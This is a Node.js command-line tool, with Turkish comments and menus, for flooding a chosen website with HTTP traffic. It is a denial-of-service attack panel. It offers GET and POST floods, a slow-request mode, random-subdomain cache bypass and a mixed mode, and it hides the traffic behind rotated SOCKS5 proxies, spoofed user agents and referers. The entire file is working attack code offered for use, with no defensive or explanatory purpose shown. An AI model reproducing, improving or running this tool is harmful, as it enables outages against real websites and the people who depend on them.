const axios = require('axios').default;
const fs = require('fs').promises;
const colors = require('colors');
const ora = require('ora');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { randomInt } = require('crypto');
const readline = require('readline');

// Kullanıcı ajanları
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0',
];

// Referer’lar
const referers = ['https://google.com', 'https://bing.com', 'https://youtube.com'];

// Proxy’ler
let proxies = [];

// Readline arayüzü
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

// Proxy yükleyici
async function loadProxies() {
    const spinner = ora('Proxy’ler yükleniyor...').start();
    try {
        const data = await fs.readFile('proxies.txt', 'utf8');
        proxies = data.split('\n').filter(line => line.trim());
        spinner.succeed(proxies.length + ' proxy yüklendi!'.green);
    } catch {
        spinner.warn('Proxy dosyası yok, direkt bağlanılıyor.'.yellow);
    }
}

// Rastgele seçim
function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
function getRandomQuery() {
    return '?r=' + Math.random().toString(36).slice(2);
}
function getRandomPath() {
    return '/p' + Math.random().toString(36).slice(2, 8);
}
function randomDelay() {
    return new Promise(resolve => setTimeout(resolve, randomInt(20, 300)));
}

// Proxy testi
async function testProxy(proxy) {
    try {
        const [host, port] = proxy.split(':');
        const agent = new SocksProxyAgent('socks5://' + host + ':' + port);
        await axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent, timeout: 3000 });
        return true;
    } catch {
        return false;
    }
}

// Rastgele subdomain
function getRandomSubdomain(url) {
    if (Math.random() > 0.7) return url;
    const host = url.split('/')[2];
    const proto = url.split('/')[0];
    return proto + '//' + Math.random().toString(36).slice(2, 8) + '.' + host;
}

// HTTP isteği
async function sendRequest(targetUrl, cookies, method) {
    if (!cookies) cookies = {};
    if (!method) method = 'GET';

    const headers = {
        'User-Agent': getRandom(userAgents),
        'Accept': getRandom(['text/html,application/xhtml+xml', 'application/json', '*/*']),
        'Accept-Language': getRandom(['en-US,en;q=0.9', 'tr-TR,tr;q=0.8']),
        'Referer': getRandom(referers),
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
    };

    if (Object.keys(cookies).length) {
        headers['Cookie'] = Object.entries(cookies).map(function([k, v]) { return k + '=' + v; }).join('; ');
    }

    const config = {
        headers: headers,
        timeout: 8000,
        maxRedirects: 10,
        validateStatus: function() { return true; },
    };

    const proxy = getRandom(proxies);
    if (proxy && await testProxy(proxy)) {
        const hostPort = proxy.split(':');
        const host = hostPort[0];
        const port = hostPort[1];
        config.httpAgent = new SocksProxyAgent('socks5://' + host + ':' + port);
        config.httpsAgent = new SocksProxyAgent('socks5://' + host + ':' + port);
    }

    try {
        var url = targetUrl;
        if (method === 'SUBDOMAIN') url = getRandomSubdomain(targetUrl);
        url = url + (Math.random() > 0.5 ? getRandomQuery() : getRandomPath());

        var response;
        if (method === 'POST') {
            response = await axios.post(url, { data: Math.random() }, config);
        } else if (method === 'SLOWLORIS') {
            await randomDelay();
            response = await axios.get(url, Object.assign({}, config, { timeout: 20000 }));
        } else {
            response = await axios.get(url, config);
        }

        var newCookies = cookies;
        if (response.headers['set-cookie']) {
            newCookies = response.headers['set-cookie'].reduce(function(acc, cookie) {
                var keyValue = cookie.split(';')[0];
                var key = keyValue.split('=')[0];
                var value = keyValue.split('=')[1];
                acc[key] = value;
                return acc;
            }, cookies);
        }

        return {
            success: response.status < 400 || [403, 503].indexOf(response.status) !== -1,
            status: response.status,
            cookies: newCookies,
        };
    } catch (error) {
        return { success: false, error: error.message, cookies: cookies };
    }
}

// Kullanıcı girişi
async function getUserInput() {
    console.clear();
    console.log('\n🌟 ' + 'SÜPER SALDIRI PANELI'.rainbow.bold + ' 🌟');
    console.log('Method seç:'.cyan);
    console.log('1 - GET Flood (Hızlı)'.green);
    console.log('2 - POST Flood (Form)'.green);
    console.log('3 - Slowloris (Yavaş)'.green);
    console.log('4 - Subdomain (Cache Bypass)'.green);
    console.log('5 - Karışık (Hepsi)'.green);

    var methodNum = await new Promise(function(resolve) { rl.question('Seçim (1-5): ', resolve); });
    var methodMap = { '1': 'GET', '2': 'POST', '3': 'SLOWLORIS', '4': 'SUBDOMAIN', '5': 'MIXED' };
    var method = methodMap[methodNum] || 'GET';

    var url = await new Promise(function(resolve) { rl.question('Hedef URL (örn: http://example.com): ', resolve); });
    if (!url.match(/^https?:\/\//)) throw new Error('URL http:// veya https:// ile başlamalı!');

    var duration = await new Promise(function(resolve) { rl.question('Süre (saniye, örn: 60): ', resolve); });
    var threads = await new Promise(function(resolve) { rl.question('Thread (örn: 10): ', resolve); });

    var parsedDuration = parseInt(duration) || 60;
    var parsedThreads = parseInt(threads) || 10;

    if (parsedDuration < 1 || parsedThreads < 1) throw new Error('Süre ve thread pozitif olmalı!');

    return { method: method, url: url, duration: parsedDuration, threads: parsedThreads };
}

// Ana fonksiyon
async function megaBypassAttack(input) {
    var method = input.method;
    var url = input.url;
    var duration = input.duration;
    var threads = input.threads;

    await loadProxies();
    console.clear();
    console.log('\n⚡ ' + 'SALDIRI BAŞLADI!'.rainbow.bold + ' ⚡');
    console.log('🔗 Hedef: ' + url.cyan);
    console.log('⏰ Süre: ' + duration + 's'.cyan);
    console.log('⚙️ Thread: ' + threads.cyan);
    console.log('🔥 Method: ' + method.cyan);

    var spinner = ora('Hazırlanıyor...').start();
    var endTime = Date.now() + duration * 1000;
    var successCount = 0;
    var failCount = 0;
    var cookies = {};

    async function worker() {
        while (Date.now() < endTime) {
            await randomDelay();
            var selectedMethod = method === 'MIXED' ? getRandom(['GET', 'POST', 'SLOWLORIS', 'SUBDOMAIN']) : method;
            var result = await sendRequest(url, cookies, selectedMethod);
            cookies = result.cookies;

            if (result.success) {
                successCount++;
                process.stdout.write('[+] ' + result.status + ' '.green);
            } else {
                failCount++;
                process.stdout.write('[-] ' + result.error.slice(0, 20) + ' '.red);
            }
        }
    }

    var workers = Array(threads).fill().map(function() { return worker(); });
    spinner.succeed('Saldırı aktif!'.green);
    await Promise.all(workers);

    console.log('\n🎉 ' + 'BİTTİ!'.rainbow.bold + ' 🎉');
    console.log('✅ Başarılı: ' + successCount.green);
    console.log('❌ Hata: ' + failCount.red);
}

// Çalıştır
(async function() {
    try {
        var input = await getUserInput();
        await megaBypassAttack(input);
    } catch (err) {
        console.error('Hata: ' + err.message.red);
    } finally {
        rl.close();
    }
})();